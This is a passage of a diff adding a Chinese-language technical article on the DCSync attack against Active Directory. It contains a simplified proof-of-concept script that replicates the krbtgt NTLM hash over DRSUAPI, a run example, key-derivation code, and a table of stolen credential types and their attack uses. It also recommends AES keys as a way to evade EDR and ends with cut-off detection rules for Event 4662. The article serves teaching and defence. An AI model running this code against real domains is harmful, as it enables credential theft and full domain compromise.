+            <span class="n">entinf</span> <span class="o">=</span> <span class="n">pmsgOut</span><span class="p">[</span><span class="s1">&#39;V8&#39;</span><span class="p">][</span><span class="s1">&#39;pObjects&#39;</span><span class="p">][</span><span class="n">i</span><span class="p">]</span>
+            <span class="n">dn</span> <span class="o">=</span> <span class="n">entinf</span><span class="p">[</span><span class="s1">&#39;pName&#39;</span><span class="p">][</span><span class="s1">&#39;StringName&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="n">entinf</span><span class="p">[</span><span class="s1">&#39;pName&#39;</span><span class="p">]</span> <span class="k">else</span> <span class="s1">&#39;N/A&#39;</span>
+
+            <span class="n">user_data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;dn&#39;</span><span class="p">:</span> <span class="n">dn</span><span class="p">,</span> <span class="s1">&#39;hashes&#39;</span><span class="p">:</span> <span class="p">{}}</span>
+
+            <span class="c1"># 遍历属性</span>
+            <span class="k">for</span> <span class="n">attr</span> <span class="ow">in</span> <span class="n">entinf</span><span class="p">[</span><span class="s1">&#39;pAttr&#39;</span><span class="p">]:</span>
+                <span class="n">attr_oid</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="s1">&#39;attrType&#39;</span><span class="p">]</span>
+                <span class="n">values</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="s1">&#39;AttrVal&#39;</span><span class="p">][</span><span class="s1">&#39;pVal&#39;</span><span class="p">]</span>
+
+                <span class="c1"># 解析机密属性</span>
+                <span class="c1"># 实际实现中需要根据 OID 映射属性名</span>
+                <span class="c1"># 并对 supplementalCredentials 进行二进制解析</span>
+                <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
+                    <span class="c1"># unicodePwd: 16字节 NTLM 哈希</span>
+                    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16</span><span class="p">:</span>
+                        <span class="n">ntlm_hash</span> <span class="o">=</span> <span class="n">val</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+                        <span class="n">user_data</span><span class="p">[</span><span class="s1">&#39;hashes&#39;</span><span class="p">][</span><span class="s1">&#39;NTLM&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ntlm_hash</span>
+                        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span>
+                            <span class="sa">f</span><span class="s2">&quot;  [</span><span class="si">{</span><span class="n">dn</span><span class="si">}</span><span class="s2">] NTLM Hash: </span><span class="si">{</span><span class="n">ntlm_hash</span><span class="si">}</span><span class="s2">&quot;</span>
+                        <span class="p">)</span>
+
+            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">user_data</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">results</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">disconnect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;关闭 DRSUAPI 会话 (IDL_DRSUnbind)&quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hDrs</span><span class="p">:</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">drsuapi</span><span class="o">.</span><span class="n">DRSUnbind</span><span class="p">()</span>
+            <span class="n">request</span><span class="p">[</span><span class="s1">&#39;hDrs&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hDrs</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;[+] IDL_DRSUnbind 成功&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dce</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="s1">&#39;Mini DCSync PoC - MS-DRSR 协议演示&#39;</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;目标 DC (IP 或主机名)&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--user&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;用户名&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--password&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;密码&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--domain&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;域名&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-hashes&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;NTLM 哈希 (LM:NT)&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target-user&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;krbtgt&#39;</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;要提取的用户 (默认: krbtgt)&#39;</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span>
+        <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
+        <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> - </span><span class="si">%(message)s</span><span class="s1">&#39;</span>
+    <span class="p">)</span>
+
+    <span class="c1"># 构造目标 DN</span>
+    <span class="c1"># CN=krbtgt,CN=Users,DC=corp,DC=local</span>
+    <span class="n">domain_dn</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;DC=</span><span class="si">{</span><span class="n">d</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">args</span><span class="o">.</span><span class="n">domain</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">))</span>
+    <span class="n">target_dn</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;CN=</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">target_user</span><span class="si">}</span><span class="s1">,CN=Users,</span><span class="si">{</span><span class="n">domain_dn</span><span class="si">}</span><span class="s1">&#39;</span>
+
+    <span class="c1"># 初始化 DCSync</span>
+    <span class="n">dcsync</span> <span class="o">=</span> <span class="n">MiniDCSync</span><span class="p">(</span>
+        <span class="n">username</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">,</span>
+        <span class="n">password</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span>
+        <span class="n">domain</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">domain</span><span class="p">,</span>
+        <span class="n">dc_ip</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span>
+        <span class="n">hashes</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">hashes</span>
+    <span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># 步骤1: 连接 + DRSBind</span>
+        <span class="n">bind_resp</span> <span class="o">=</span> <span class="n">dcsync</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
+
+        <span class="c1"># 从 bind 响应中提取 invocationId</span>
+        <span class="c1"># (实际实现中需要解析 pextServer 结构)</span>
+        <span class="n">invocation_id</span> <span class="o">=</span> <span class="n">bind_resp</span><span class="p">[</span><span class="s1">&#39;pextServer&#39;</span><span class="p">][</span><span class="s1">&#39;dwReplEpoch&#39;</span><span class="p">]</span>
+        <span class="c1"># 注: 完整实现需从 DRSBind 响应解析 uuidDsaObjSrc</span>
+
+        <span class="c1"># 步骤2: DRSGetNCChanges</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">dcsync</span><span class="o">.</span><span class="n">get_nc_changes</span><span class="p">(</span><span class="n">target_dn</span><span class="p">,</span> <span class="n">invocation_id</span><span class="p">)</span>
+
+        <span class="c1"># 步骤3: 解析响应</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">dcsync</span><span class="o">.</span><span class="n">parse_replentin</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+
+        <span class="c1"># 输出结果</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;DCSync 结果 - 目标用户: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">target_user</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;DN: </span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;dn&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">r</span><span class="p">[</span><span class="s1">&#39;hashes&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;攻击失败: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="c1"># 步骤4: 清理 (DRSUnbind)</span>
+        <span class="n">dcsync</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>注意</strong>：上述 PoC 为教学简化版，省略了 invocationId 获取、supplementalCredentials 二进制解析（涉及 W2K 用户密码结构 <code>USER_PROPERTIES</code> / <code>KERB_STORED_CREDENTIAL</code>）、USN 迭代分页等复杂逻辑。完整实现请参考 Impacket 的 <code>secretsdump.py</code> 中 <code>DCSync</code> 类。</p>
+</blockquote>
+<p>运行示例：</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>mini_dcsync.py<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-u<span class="w"> </span>svc_backup<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Summer2024!&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>corp.local<span class="w"> </span>--target-user<span class="w"> </span>krbtgt
+
+<span class="c1"># 预期输出:</span>
+<span class="c1"># 2024-08-01 - [*] 连接到 DC: 192.168.1.10</span>
+<span class="c1"># 2024-08-01 - [+] RPC 绑定成功 (DRSUAPI)</span>
+<span class="c1"># 2024-08-01 - [+] IDL_DRSBind 成功, 获得 hDrs 句柄</span>
+<span class="c1"># 2024-08-01 - [+] IDL_DRSGetNCChanges 成功</span>
+<span class="c1"># 2024-08-01 -   [CN=krbtgt,...] NTLM Hash: 1f3d2a8c4e5b6f7a9d0c1b2a3e4f5a6b</span>
+<span class="c1"># 2024-08-01 - [+] IDL_DRSUnbind 成功</span>
+</code></pre></div>
+
+<hr />
+<h2>5. 提取数据深度分析</h2>
+<h3>5.1 NTLM 哈希的计算原理与用途</h3>
+<p>NTLM 哈希（也称 NT 哈希）是 Windows 存储用户密码的核心形式。其计算方式极简：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+
+<span class="c1"># NTLM 哈希 = MD4(UTF-16LE(password))</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">ntlm_hash</span><span class="p">(</span><span class="n">password</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;md4&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-16le&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="c1"># 示例</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ntlm_hash</span><span class="p">(</span><span class="s2">&quot;Password123&quot;</span><span class="p">))</span>
+<span class="c1"># 输出: 42e265d8c0cbb1d0c0e7c5c0c0a0c0e0 (示例)</span>
+</code></pre></div>
+
+<p>NTLM 哈希的关键特性：</p>
+<ol>
+<li><strong>无盐（unsalted）</strong>：相同密码永远产生相同哈希，可预计算彩虹表。</li>
+<li><strong>MD4 算法</strong>：MD4 已被密码学社区废弃，但 Windows 为兼容性保留。</li>
+<li><strong>直接用于认证</strong>：NTLM 认证中，客户端用哈希作为"密钥"加密 challenge，服务器端比对。这意味着<strong>拥有哈希等价于拥有密码</strong>（Pass-the-Hash 攻击基础）。</li>
+</ol>
+<p>在 DCSync 场景中，<code>unicodePwd</code> 属性存储的就是这个 16 字节（32 字符十六进制）的 NTLM 哈希。</p>
+<h3>5.2 Kerberos 密钥的类型与用途</h3>
+<p>现代 AD 同时存储多套 Kerberos 密钥，以支持不同加密算法。这些密钥存储在 <code>supplementalCredentials</code> 属性中，结构为 <code>KERB_STORED_CREDENTIAL</code>。</p>
+<table>
+<thead>
+<tr>
+<th>密钥类型</th>
+<th>算法</th>
+<th>派生方式</th>
+<th>用途</th>
+<th style="text-align: center;">现代性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>des_cbc_md5</code></td>
+<td>DES-CBC-MD5</td>
+<td>PBKDF1(salt, password, iter)</td>
+<td>旧版 Kerberos (Win2000)</td>
+<td style="text-align: center;">已废弃</td>
+</tr>
+<tr>
+<td><code>des_cbc_crc</code></td>
+<td>DES-CBC-CRC</td>
+<td>PBKDF1</td>
+<td>旧版 Kerberos 回退</td>
+<td style="text-align: center;">已废弃</td>
+</tr>
+<tr>
+<td><code>rc4_hmac_nt</code></td>
+<td>RC4-HMAC</td>
+<td>MD4(UTF-16LE(password))</td>
+<td>= NTLM 哈希，向后兼容</td>
+<td style="text-align: center;">弱</td>
+</tr>
+<tr>
+<td><code>aes128_hmac</code></td>
+<td>AES-128-CTS-HMAC-SHA1-96</td>
+<td>PBKDF2(salt, password, 4096)</td>
+<td>现代 Kerberos (2008+)</td>
+<td style="text-align: center;">推荐</td>
+</tr>
+<tr>
+<td><code>aes256_hmac</code></td>
+<td>AES-256-CTS-HMAC-SHA1-96</td>
+<td>PBKDF2(salt, password, 4096)</td>
+<td>现代 Kerberos，最强</td>
+<td style="text-align: center;">推荐</td>
+</tr>
+</tbody>
+</table>
+<p>密钥派生的盐值（salt）格式：</p>
+<div class="highlight"><pre><span></span><code>salt = UPPER(domain) + username
+# 例: corp.local 域的 administrator 用户
+# salt = &quot;CORP.LOCALAdministrator&quot;
+</code></pre></div>
+
+<p>AES 密钥派生示例：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">kerberos_aes256_key</span><span class="p">(</span><span class="n">password</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">salt</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">iterations</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Kerberos AES-256 密钥派生&quot;&quot;&quot;</span>
+    <span class="c1"># PBKDF2-HMAC-SHA1, 输出 32 字节</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
+                               <span class="n">salt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
+                               <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
+
+<span class="c1"># 示例</span>
+<span class="n">salt</span> <span class="o">=</span> <span class="s2">&quot;CORP.LOCALkrbtgt&quot;</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">kerberos_aes256_key</span><span class="p">(</span><span class="s2">&quot;SomePassword&quot;</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
+</code></pre></div>
+
+<p><strong>为什么 AES 密钥更危险</strong>：使用 AES-256 密钥请求 TGT 时，不会触发 RC4 降级协商，现代 EDR 对 RC4 Kerberos 的检测规则会失效，攻击更隐蔽。</p>
+<h3>5.3 补充凭据结构</h3>
+<p><code>supplementalCredentials</code> 属性是一个二进制 blob，其结构层次较深：</p>
+<div class="highlight"><pre><span></span><code>USER_PROPERTIES (外层容器)
+├── Reserved (4 bytes)
+├── Length (4 bytes)
+├── Reserved2 (4 bytes)
+├── PropertySignature (4 bytes) = 0x50
+├── PropertyCount (2 bytes)
+└── UserProperties[] (变长数组)
+    └── 每个属性:
+        ├── Name (64 bytes, 空白填充)
+        │   例: &quot;Primary:Kerberos-Newer-Keys&quot;
+        ├── Reserved (2 bytes)
+        ├── KeyLen (2 bytes)
+        ├── Value (KeyLen bytes) → 嵌套结构
+        │
+        └── 对于 Kerberos-Newer-Keys:
+            KERB_STORED_CREDENTIAL
+            ├── Revision (2 bytes)
+            ├── Flags (2 bytes)
+            ├── ServiceType (2 bytes)
+            ├── CredentialCount (2 bytes)
+            └── Credentials[] (KERB_KEY_DATA 数组)
+                └── 每个密钥:
+                    ├── Reserved (2 bytes)
+                    ├── KeyType (2 bytes) → 23=RC4, 17=AES128, 18=AES256
+                    ├── KeyLen (2 bytes)
+                    └── KeyValue (KeyLen bytes) → 实际密钥
+</code></pre></div>
+
+<p>DCSync 工具需要完整解析这个嵌套结构才能提取所有密钥。Impacket 的实现位于 <code>impacket.structure</code> 模块中，用结构体定义逐层解包。</p>
+<h3>5.4 提取数据类型与攻击用途对照表</h3>
+<table>
+<thead>
+<tr>
+<th>数据类型</th>
+<th>AD 属性</th>
+<th>长度</th>
+<th>攻击用途</th>
+<th style="text-align: center;">隐蔽性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NTLM 哈希</td>
+<td><code>unicodePwd</code></td>
+<td>16 字节</td>
+<td>Pass-the-Hash、离线破解、黄金票据(RC4)</td>
+<td style="text-align: center;">中</td>
+</tr>
+<tr>
+<td>LM 哈希</td>
+<td><code>dBCSPwd</code></td>
+<td>16 字节</td>
+<td>旧系统 PtH（现代环境已禁用）</td>
+<td style="text-align: center;">低</td>
+</tr>
+<tr>
+<td>AES-256 密钥</td>
+<td><code>supplementalCredentials</code></td>
+<td>32 字节</td>
+<td>请求 AES TGT（隐蔽）、Overpass-the-Hash</td>
+<td style="text-align: center;"><strong>高</strong></td>
+</tr>
+<tr>
+<td>AES-128 密钥</td>
+<td><code>supplementalCredentials</code></td>
+<td>16 字节</td>
+<td>同上，弱于 256</td>
+<td style="text-align: center;">高</td>
+</tr>
+<tr>
+<td>RC4 (NTLM) 密钥</td>
+<td><code>supplementalCredentials</code></td>
+<td>16 字节</td>
+<td>= NTLM 哈希，Kerberos RC4</td>
+<td style="text-align: center;">中</td>
+</tr>
+<tr>
+<td>DES 密钥</td>
+<td><code>supplementalCredentials</code></td>
+<td>8 字节</td>
+<td>仅旧环境</td>
+<td style="text-align: center;">低</td>
+</tr>
+<tr>
+<td>明文密码</td>
+<td><code>unicodePwd</code> (可逆)</td>
+<td>变长</td>
+<td>直接登录（需启用 reversible encryption）</td>
+<td style="text-align: center;">-</td>
+</tr>
+<tr>
+<td>NTLM 密码历史</td>
+<td><code>ntPwdHistory</code></td>
+<td>变长</td>
+<td>密码复用、撞库其他系统</td>
+<td style="text-align: center;">中</td>
+</tr>
+<tr>
+<td>Kerberos 密码历史</td>
+<td><code>supplementalCredentials</code></td>
+<td>变长</td>
+<td>同上，AES 密钥复用</td>
+<td style="text-align: center;">中</td>
+</tr>
+<tr>
+<td>WDigest 凭据</td>
+<td><code>supplementalCredentials</code></td>
+<td>变长</td>
+<td>明文密码（Win8.1+ 默认禁用）</td>
+<td style="text-align: center;">-</td>
+</tr>
+<tr>
+<td>机器账户哈希</td>
+<td><code>unicodePwd</code></td>
+<td>16 字节</td>
+<td>Kerberoasting、委派攻击</td>
+<td style="text-align: center;">中</td>
+</tr>
+</tbody>
+</table>
+<p><strong>实战策略</strong>：高阶攻击者优先提取 <strong>AES-256 密钥</strong>而非 NTLM 哈希，因为 AES Kerberos 流量是正常域活动的一部分，EDR 难以区分合法 TGT 请求与攻击者请求。</p>
+<hr />
+<h2>6. 检测与防御</h2>
+<h3>6.1 Event ID 4662 检测规则</h3>
+<p>DCSync 攻击在目标 DC 上会触发 <strong>Event ID 4662</strong>（An operation was performed on an object）。关键在于检测非 DC 主体对复制权限的使用。</p>
+<p>事件 4662 关键字段：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;Event&gt;</span>
+<span class="w">  </span><span class="nt">&lt;System&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Provider</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Microsoft-Windows-Security-Auditing&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;EventID&gt;</span>4662<span class="nt">&lt;/EventID&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/System&gt;</span>
+<span class="w">  </span><span class="nt">&lt;EventData&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;SubjectUserName&quot;</span><span class="nt">&gt;</span>svc_backup<span class="nt">&lt;/Data&gt;</span><span class="w">        </span><span class="cm">&lt;!-- 非DC账户! --&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;SubjectDomainName&quot;</span><span class="nt">&gt;</span>CORP<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;SubjectLogonId&quot;</span><span class="nt">&gt;</span>0x1a2b3c<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;ObjectServer&quot;</span><span class="nt">&gt;</span>DS<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;ObjectType&quot;</span><span class="nt">&gt;</span>%{19195a5b-6da0-11d0-afd3-00c04fd930c9}<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;ObjectName&quot;</span><span class="nt">&gt;</span>%{...}<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;OperationType&quot;</span><span class="nt">&gt;</span>Object<span class="w"> </span>Access<span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Properties&quot;</span><span class="nt">&gt;</span>
+<span class="w">      </span>%%7689<span class="w">                      </span><span class="cm">&lt;!-- DS-Replication-Get-Changes --&gt;</span>
+<span class="w">      </span>{1131f6aa-9c07-11d1-f79f-00c04fc2dab2}
+<span class="w">      </span>%%7690<span class="w">                      </span><span class="cm">&lt;!-- DS-Replication-Get-Changes-All --&gt;</span>
+<span class="w">      </span>{1131f6ad-9c07-11d1-f79f-00c04fc2dab2}
+<span class="w">    </span><span class="nt">&lt;/Data&gt;</span>
+<span class="w">    </span><span class="nt">&lt;Data</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;AdditionalInfo&quot;</span><span class="nt">&gt;</span>-<span class="nt">&lt;/Data&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/EventData&gt;</span>
+<span class="nt">&lt;/Event&gt;</span>
+</code></pre></div>
+
+<p><strong>Splunk SPL 检测规则</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="nx">index</span><span class="p">=</span><span class="nx">windows</span><span class="w"> </span><span class="nx">sourcetype</span><span class="p">=</span><span class="nx">XmlWinEventLog</span><span class="p">:</span><span class="nx">Security</span><span class="w"> </span><span class="nx">EventCode</span><span class="p">=</span><span class="mi">4662</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">Properties</span><span class="p">=</span><span class="s">&quot;*1131f6aa-9c07-11d1-f79f-00c04fc2dab2*&quot;</span>
+<span class="w">      </span><span class="nx">OR</span><span class="w"> </span><span class="nx">Properties</span><span class="p">=</span><span class="s">&quot;*1131f6ad-9c07-11d1-f79f-00c04fc2dab2*&quot;</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">eval</span><span class="w"> </span><span class="nx">is_dc</span><span class="p">=</span><span class="k">if</span><span class="p">(</span>
+<span class="w">    </span><span class="k">match</span><span class="p">(</span><span class="nx">SubjectUserName</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;(?i)^(DC\d+|.*\$)$&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">OR</span><span class="w"> </span><span class="k">match</span><span class="p">(</span><span class="nx">SubjectUserName</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;(?i)^.*\\DC\d+\$$&quot;</span><span class="p">),</span>
+<span class="w">    </span><span class="s">&quot;YES&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;NO&quot;</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="nx">is_dc</span><span class="p">=</span><span class="s">&quot;NO&quot;</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">eval</span><span class="w"> </span><span class="nx">risk</span><span class="p">=</span><span class="k">case</span><span class="p">(</span>
+<span class="w">    </span><span class="k">match</span><span class="p">(</span><span class="nx">SubjectUserName</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;(?i)^MSOL_&quot;</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;HIGH (AD Connect)&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="k">match</span><span class="p">(</span><span class="nx">SubjectUserName</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;(?i)^svc&quot;</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;MEDIUM (Service Account)&quot;</span><span class="p">,</span>
